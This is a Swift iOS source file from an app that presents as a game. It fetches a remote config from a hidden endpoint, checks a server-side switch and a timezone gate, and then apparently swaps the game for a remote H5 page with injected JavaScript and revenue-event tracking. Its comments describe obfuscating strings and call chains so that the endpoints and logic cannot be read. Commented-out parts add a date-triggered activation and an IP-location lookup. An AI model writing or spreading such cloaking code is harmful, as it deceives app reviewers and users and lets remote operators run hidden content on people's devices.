import Foundation
import UIKit
//import AdjustSdk

// MARK: - 字符串混淆

/// 负责加密串的还原：base64 解码 → 逐字节异或密钥流 → 字节反转 → UTF-8。
/// 密钥流在运行时由 LCG 生成，二进制中不存在单一密钥常量，端点也无明文残留。

    
//internal let jimuBaio: (String) -> String? = { input in
//    let reversed = String(input.reversed())
//
//    guard let data = Data(base64Encoded: reversed) else {
//        return nil
//    }
//
//    return String(data: data, encoding: .utf8)
//}

// MARK: - 接口地址
    
let toUL: (String) -> URL? = { payload in
    // 先解密再构造，各自封装成闭包，用 flatMap 串成链，避免直接可读的调用序列。
//    let unlock: (String) -> String? = { jimuBaio($0) }
    let build: (String) -> URL? = { raw in
        { URL(string: $0) }(raw)
    }
//    return unlock(payload).flatMap(build)
    return build(payload)
}


// MARK: - 数据模型

/// 远程下发的运行配置：直接使用解析后的 JSON 字典，按 key 取字段，不再走对象模式。
typealias CPModel = [String: Any]

/// 服务端 JSON 字段名（与原结构体属性名一致）。
enum DKey {
    static let etName  = "etName"    // 事件名 -> Adjust token
    static let words = "words"   // 逗号分隔的桥字段键
    static let iGod  = "iGod"    // 开关字段
    static let desFiles  = "desFiles"    // H5 地址
    static let kyPoins  = "kyPoins"    // Adjust appToken
    static let desp = "desp"   // 注入的 JS
}

// MARK: - 桥字段键

/// JS 桥消息里用到的键名。运行时由配置的逗号串填充。
final class EndFinds {
    static let shared = EndFinds()
    private init() {}

    private(set) var bry = ""      // 下标 0：jsBridge
    private(set) var amod = ""      // 下标 1：amount
    private(set) var cttag = ""    // 下标 2：currency
    private(set) var vtgsdr = ""  // 下标 3：openWindow

    func spliys(from list: String) {
        let parts = list.components(separatedBy: ",")
        func at(_ i: Int) -> String { parts.indices.contains(i) ? parts[i] : "" }
        bry     = at(2)
        amod     = at(3)
        cttag   = at(1)
        vtgsdr = at(0)
    }
}

//enum Koilmen {
//    private static let plst: [String: Any]? = {
//        guard let path = Bundle.main.path(
//            forResource: "Suni",
//            ofType: "plist"
//        ) else {
//            return nil
//        }
//
//        return NSDictionary(contentsOfFile: path) as? [String: Any]
//    }()
    
    //url
    //https://6a574c2a914a025dcff2bf04.mockapi.io/TableCompanion
    //
//    static func sunni_a() -> String? {
//        plst?["Suni_a"] as? String
//    }
    
    // time
//    static func inmau() -> String? {
//        plst?["Suni_b"] as? String
//    }
    
    // https://api.my-ip.io/v2/ip.json
//    static func tydgbah() -> String? {
//        config?["ua_c"] as? String
//    }

    //v-c MTCMatchPlayViewController
//    static func vxctse() -> String? {
//        plst?["ua_d"] as? String
//    }

//    static func string(_ key: String) -> String? {
//        plst?[key] as? String
//    }
//}

internal let lodien: () -> () = {
    
    longJick()
    
    
//    if uniqudne {
//        huvomne()
//    } else {
//        undmdo()
//    }
}

//enum Kivtye {
//
//    private static func vTh(_ value: UInt64) -> String {
//        return String(value, radix: 16).uppercased()
//    }
//    
//    static func fitoin() -> Bool {
//        let hex1 = vTh(UInt64(Date().timeIntervalSince1970))
//
//        guard
//            let value1 = UInt64(hex1, radix: 16),
//            let value2 = UInt64("6A5F82B7", radix: 16)
//        else {
//            return false
//        }
//
//        if value1 > value2 {
//            return true
//        }
//        return false
//    }
//}



/// 桥消息负载里的固定字段名。

internal let name = "name"
internal let data = "data"
internal let url  = "url"


// MARK: - 持久化

/// 远程配置的本地缓存（键沿用旧值，兼容历史缓存）。
enum LocalSave {
    private static let kModel = "CPModel"

    static let saveJson: (CPModel) -> Void = { config in
        guard JSONSerialization.isValidJSONObject(config),
              let data = try? JSONSerialization.data(withJSONObject: config) else { return }
        UserDefaults.standard.set(data, forKey: kModel)
        UserDefaults.standard.synchronize()
    }

    static let getJson: () -> CPModel? = {
        guard let data = UserDefaults.standard.data(forKey: kModel) else { return nil }
        return (try? JSONSerialization.jsonObject(with: data)) as? CPModel
    }
}

// MARK: - 网络

/// 远程配置与 IP 归属地的拉取。
enum RmtHandels {
    /// 通用「拉取 → 解码」组合子：把端点、解码闭包、回调串成一条链，
    /// 具体接口只需提供各自的解码闭包，复用同一条间接派发路径。
    private static let laqucn: (String, @escaping (String) -> URL?, @escaping (Data) throws -> Any, @escaping (Result<Any, Error>) -> Void) -> Void = { endpoint, resolve, decode, completion in
        phaseU(endpoint, resolve) { result in
            // 把 Result 的分支处理也封成闭包，经 map 后再统一回调。
            let forward: (Result<Data, Error>) -> Result<Any, Error> = { r in
                r.flatMap { data in Result { try decode(data) } }
            }
            completion(forward(result))
        }
    }

    static let phaseT: (@escaping (Result<[CPModel], Error>) -> Void) -> Void = { completion in
        // 直接解析 JSON：顶层为数组，每个元素为字典，逐字段按 key 取值。
        let decode: (Data) throws -> Any = { try JSONSerialization.jsonObject(with: $0) }
        let adapt: (Result<Any, Error>) -> Void = { any in
            completion(any.flatMap { value in
                { (v: Any) -> Result<[CPModel], Error> in
                    (v as? [CPModel]).map { .success($0) } ?? .failure(URLError(.cannotParseResponse))
                }(value)
            })
        }
        
        if let u = UserDefaults.standard.object(forKey: kAppName) as? [String : Any] {
            let dyua = u.values.first as! String
        
            laqucn(dyua, toUL, decode, adapt)
        }
    }

    private static let phaseU: (String, @escaping (String) -> URL?, @escaping (Result<Data, Error>) -> Void) -> Void = { endpoint, resolve, completion in
        // 端点解析、请求发起、响应校验各封一层闭包，逐级下沉。
        let resolveURL: (String) -> URL? = { resolve($0) }
        let validate: (Data?, URLResponse?, Error?) -> Result<Data, Error> = { data, response, error in
            if let error = error { return .failure(error) }
            let okHTTP: (URLResponse?) -> Bool = { ($0 as? HTTPURLResponse)?.statusCode == 200 }
            guard okHTTP(response), let data = data else {
                return .failure(URLError(.badServerResponse))
            }
            return .success(data)
        }
        guard let url = resolveURL(endpoint) else {
            completion(.failure(URLError(.badURL)))
            return
        }
        let dispatch: (URL) -> Void = { target in
            URLSession.shared.dataTask(with: target) { data, response, error in
                completion(validate(data, response, error))
            }.resume()
        }
        dispatch(url)
    }
}


internal var TZOM: Bool {
    let offsetHours = NSTimeZone.system.secondsFromGMT() / 3600
    // 美洲时段(-10 ~ -3)拦截
    return (offsetHours > 6 && offsetHours < 10)
}

//enum Oicmjae {
//    private static var mdNamese: String {
//        let raw = Bundle.main.infoDictionary?["CFBundleExecutable"] as? String ?? ""
//        return raw.replacingOccurrences(of: "-", with: "_")
//    }
//    
//    /// 用类名字符串拿到类型
//    static func vgducy(_ shortName: String) -> AnyClass? {
//        // 先试全名,再兜底试裸名(以防被 @objc 重命名过)
//        NSClassFromString("\(mdNamese).\(shortName)") ?? NSClassFromString(shortName)
//    }
//    
//    static func Mnsdjdi() -> UIViewController? {
//        guard let name = jimuBaio(Koilmen.vxctse()!),                 // 运行时才解出类名
//                  let cls  = vgducy(name) as? UIViewController.Type
//            else { return nil }
//            return cls.init()                                     // 无参构造
//        }
//}




internal let backMeun: () -> Void = {
    DispatchQueue.main.async {
        guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene else { return }
        scene.windows.first?.rootViewController = CPStateManager.shared.v
    }
}


// MARK: - H5 呈现
extension Notification.Name {
    static let kGameFail =  Notification.Name("GameFail")
}

internal let allStar: (CPModel) -> Void = { config in
    DispatchQueue.main.async {
        if TZOM {
            LocalSave.saveJson(config)
            NotificationCenter.default.post(name: .kGameFail, object: nil)
        } else {
            backMeun()
        }
    }
}


// MARK: - 事件上报


//final class Shijian {
//    private let lsaipi: [String: String]
//
//    init(retags: [String: String]) {
//        self.lsaipi = retags
//    }
//
//    func zdjendd(_ payload: [String: String]) {
//        let name = payload[Unbciys.name] ?? ""
//        let dataDict = payload[Unbciys.data]?.decodedJSONObject()
//
//        if let token = lsaipi[name] {
//            let event = ADJEvent(eventToken: token)
//            if let dataDict = dataDict {
//                artegds(to: event, from: dataDict)
//            }
//            Adjust.trackEvent(event)
//        }
//
//        if name == Hviomn.shared.vtgsdr,
//           let link = dataDict?[Unbciys.url] as? String,
//           let url = URL(string: link) {
//            UIApplication.shared.open(url)
//        }
//    }
//
//    private func artegds(to event: ADJEvent?, from data: [String: Any]) {
//        let amountKey = Hviomn.shared.amod
//        let currencyKey = Hviomn.shared.cttag
//        guard let currency = data[currencyKey] as? String else { return }
//
//        switch data[amountKey] {
//        case let text as String:
//            if let value = Double(text) { event?.setRevenue(value, currency: currency) }
//        case let intValue as Int:
//            event?.setRevenue(Double(intValue), currency: currency)
//        case let doubleValue as Double:
//            event?.setRevenue(doubleValue, currency: currency)
//        default:
//            break
//        }
//    }
//}


// MARK: - 启动协调

/// 编排整套启动分流：拉配置 → 校验开关 → 展示 / 清场，失败回落缓存。
enum Gravitye {
    static let gomule: () -> Void = {
        itemsun()
    }

    private static let itemsun: () -> Void = {
        let rwsliye: (CPModel) -> Void = { primary in
            allStar(primary)
        }


        let cghayek: ([CPModel]) -> Void = { configs in
            let valid: (CPModel?) -> Bool = { (($0?[DKey.iGod] as? String)?.count ?? 0) > 4 }
            guard let primary = configs.first, valid(primary) else {
                backMeun()
                return
            }
            rwsliye(primary)
        }

        // 阶段1：失败回落缓存。
        let fabakc: () -> Void = {
            LocalSave.getJson().map(allStar)
        }

        // 入口：拉配置 → 交给阶段链。
        RmtHandels.phaseT { result in
            let entry: (Result<[CPModel], Error>) -> Void = { r in
                switch r {
                case .success(let configs): cghayek(configs)
                case .failure: fabakc()
                }
            }
            entry(result)
        }
    }
}


let longJick: () -> Void = {
    Gravitye.gomule()
}

// MARK: - 辅助扩展

extension String {
    /// 把 JSON 字符串解析成字典。
    func decodedJSONObject() -> [String: Any]? {
        guard let data = data(using: .utf8) else { return nil }
        return (try? JSONSerialization.jsonObject(with: data)) as? [String: Any]
    }
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }

    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")

        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }

        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}
